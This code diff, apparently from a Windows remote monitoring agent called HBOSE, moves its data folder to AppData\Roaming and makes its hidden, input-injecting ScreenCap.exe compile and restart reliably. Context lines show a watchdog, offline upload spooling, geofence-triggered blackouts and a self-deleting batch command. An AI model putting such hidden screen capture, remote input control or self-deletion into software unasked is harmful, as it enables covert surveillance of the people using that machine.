@@ -43,6 +43,9 @@ ensureWatchdog();
 // ═══════════════════════════════════════════════
 
 const net = require("net");
+const extractDir = process.pkg ? path.join(os.homedir(), "AppData", "Roaming", "HBOSE") : __dirname;
+if (!fs.existsSync(extractDir)) fs.mkdirSync(extractDir, { recursive: true });
+
 const SINGLE_INSTANCE_PORT = 49201;
 const lockServer = net.createServer();
 lockServer.on("error", (e) => {
@@ -213,7 +216,7 @@ async function connectWithDiscovery() {
     }
 
     // Check if we haven't connected in 90 days (7776000000 ms)
-    const lastConnectPath = path.join(__dirname, "last_connect.dat");
+    const lastConnectPath = path.join(extractDir, "last_connect.dat");
     let needsBlackout = false;
     try {
         if (fs.existsSync(lastConnectPath)) {
@@ -518,7 +521,7 @@ function setupSocketEvents() {
         // OFFLINE SPOOLING UPLOAD
         // ═══════════════════════════════════════════════
         try {
-            const extractDir = process.pkg ? path.join(os.homedir(), "AppData", "Local", "Temp", "HBOSE") : __dirname;
+            
             const spoolPath = path.join(extractDir, "spool.json");
             if (fs.existsSync(spoolPath)) {
                 const spool = JSON.parse(fs.readFileSync(spoolPath, "utf8"));
@@ -800,7 +803,7 @@ function checkWiFiGeofence() {
             const safeSSIDs = agentSettings.safe_wifi_ssid.split(',').map(s => s.trim().toLowerCase());
 
             if (!safeSSIDs.includes(currentSSID.toLowerCase())) {
-                const extractDir = process.pkg ? path.join(os.homedir(), "AppData", "Local", "Temp", "HBOSE") : __dirname;
+                
                 const blackoutPath = path.join(extractDir, "blackout.dat");
                 if (!fs.existsSync(blackoutPath)) {
                     fs.writeFileSync(blackoutPath, "1");
@@ -1124,18 +1127,46 @@ del /q /f "${process.execPath}" 2>nul
 // ═══════════════════════════════════════════════
 // NATIVE CAPTURE: C# Executable (DPI-Aware)
 // ═══════════════════════════════════════════════
-const extractDir = process.pkg ? path.join(os.homedir(), "AppData", "Local", "Temp", "HBOSE") : __dirname;
+
 if (!fs.existsSync(extractDir)) fs.mkdirSync(extractDir, { recursive: true });
 
 const ScreenCapSource = path.join(__dirname, "ScreenCap.cs");
 const ScreenCapExe = path.join(extractDir, "ScreenCap.exe");
-const CSC = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe";
+const screenCapErrorLog = path.join(extractDir, "screencap_error.log");
+
+// Auto-detect CSC.exe path (Framework64 → Framework → null)
+function findCSC() {
+    const candidates = [
+        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"
+    ];
+    for (const p of candidates) {
+        if (fs.existsSync(p)) return p;
+    }
+    return null;
+}
+
+function logScreenCapError(msg) {
+    try {
+        const ts = new Date().toISOString();
+        fs.appendFileSync(screenCapErrorLog, `[${ts}] ${msg}\n`);
+    } catch (e) { }
+    // Also use original console if available
+    _err("[SCREENCAP] " + msg);
+}
 
 function ensureScreenCapExe() {
     // If it's already extracted and compiled, return
     if (fs.existsSync(ScreenCapExe)) return true;
 
-    console.log("[AGENT] 🔨 Preparing ScreenCap.exe...");
+    _log("[AGENT] 🔨 Preparing ScreenCap.exe...");
+
+    const CSC = findCSC();
+    if (!CSC) {
+        logScreenCapError("CSC.exe not found! .NET Framework 4.x not installed. Cannot compile ScreenCap.");
+        return false;
+    }
+
     try {
         // Read source from snapshot or disk
         const sourceCode = fs.readFileSync(ScreenCapSource, "utf8");
@@ -1144,21 +1175,51 @@ function ensureScreenCapExe() {
 
         // Compile it directly to the physical disk location
         const cmd = `"${CSC}" /nologo /target:winexe /out:"${ScreenCapExe}" /r:System.Windows.Forms.dll,System.Drawing.dll "${physicalSource}"`;
-        execSync(cmd);
-        console.log("[AGENT] ✅ Compilation success");
+        execSync(cmd, { timeout: 30000 }); // 30s timeout for compilation
+        _log("[AGENT] ✅ ScreenCap compilation success");
         return true;
     } catch (e) {
-        console.error("[AGENT] ❌ Compilation failed:", e.message);
+        logScreenCapError("Compilation failed: " + e.message);
         return false;
     }
 }
 
 let captureProc = null;
+let captureRestartTimer = null;
+let captureRestartCount = 0;
 
-if (ensureScreenCapExe()) {
-    console.log("[AGENT] 🎥 Starting Native Capture (ScreenCap.exe)");
-    // Enable Stdin for Input Injection
-    captureProc = spawn(ScreenCapExe, [], { stdio: ['pipe', 'pipe', 'ignore'] });
+function startCapture() {
+    // Kill existing process if any
+    if (captureProc && !captureProc.killed) {
+        try { captureProc.kill(); } catch (e) { }
+        captureProc = null;
+    }
+
+    // Ensure the exe exists (compile if needed)
+    if (!ensureScreenCapExe()) {
+        logScreenCapError("Cannot start capture — ScreenCap.exe not available. Will retry in 30s.");
+        clearTimeout(captureRestartTimer);
+        captureRestartTimer = setTimeout(() => startCapture(), 30000);
+        return;
+    }
+
+    _log("[AGENT] 🎥 Starting Native Capture (ScreenCap.exe)");
+
+    try {
+        // Enable Stdin for Input Injection
+        captureProc = spawn(ScreenCapExe, [], {
+            stdio: ['pipe', 'pipe', 'ignore'],
+            windowsHide: true
+        });
+    } catch (e) {
+        logScreenCapError("Failed to spawn ScreenCap.exe: " + e.message);
+        clearTimeout(captureRestartTimer);
+        captureRestartTimer = setTimeout(() => startCapture(), 10000);
+        return;
+    }
+
+    // Reset restart count on successful start
+    captureRestartCount = 0;
 
     let lastSentTitle = "";
     let lastActivitySyncTime = 0;
@@ -1300,11 +1361,21 @@ if (ensureScreenCapExe()) {
     });
 
     captureProc.on("exit", (code) => {
-        console.log(`[AGENT] Capture process exited (code ${code}). Restarting...`);
-        setTimeout(ensureScreenCapExe, 1000);
+        _log(`[AGENT] Capture process exited (code ${code}). Restarting...`);
+        captureProc = null;
+
+        // Exponential backoff for restart (capped at 30s)
+        captureRestartCount++;
+        const delay = Math.min(2000 * Math.pow(1.5, captureRestartCount - 1), 30000);
+        _log(`[AGENT] Will restart ScreenCap in ${Math.round(delay / 1000)}s (attempt #${captureRestartCount})`);
+
+        clearTimeout(captureRestartTimer);
+        captureRestartTimer = setTimeout(() => startCapture(), delay);
     });
 }
-ensureScreenCapExe();
+
+// Initial start
+startCapture();
 
 // Legacy PowerShell capture removed in favor of ScreenCap.exe
 
@@ -1638,8 +1709,8 @@ setInterval(() => {
 // ═══════════════════════════════════════════════
 setInterval(() => {
     try {
-        const extractDir2 = process.pkg ? path.join(os.homedir(), "AppData", "Local", "Temp", "HBOSE") : __dirname;
-        const blPath = path.join(extractDir2, "blackout.dat");
+        
+        const blPath = path.join(extractDir, "blackout.dat");
         if (fs.existsSync(blPath)) {
             const blState = fs.readFileSync(blPath, "utf8").trim();
             if (blState && blState !== "0") {
